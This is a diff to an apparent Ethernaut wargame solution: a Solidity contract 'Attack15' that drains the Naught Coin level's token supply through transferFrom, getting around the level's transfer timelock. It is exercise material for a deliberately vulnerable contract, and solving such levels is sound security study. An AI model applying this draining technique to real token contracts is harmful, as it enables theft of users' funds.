@@ -1,25 +1,22 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.0;
+pragma solidity ^0.8.0;
 
 import "./15-naught-coin.sol";
 
-// import the IERC20 interface?  Need to call transferFrom()
+// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
 contract Attack15 {
     // state variables
     NaughtCoin public target;
 
-    constructor(address _targetAddress) {
+    constructor(address _targetAddress) payable {
         // initialise values
         target = NaughtCoin(_targetAddress);
     }
 
-    function attack(address _from, address _to, uint256 _amount) public {
+    // function attack(address _from, address _to, uint256 _amount) public {
+    function attack() public {
         // call transferFrom
-        // function transferFrom(address _from, address _to, uint256 _value)
-        // public returns (bool success)
-
-        // from: ETHERNAUT_INSTANCE, to: PLAYER, amount: INITIAL_SUPPLY
-        target.transferFrom(_from, _to, _amount);
+        target.transferFrom(msg.sender, address(this), target.INITIAL_SUPPLY());
     }
 }
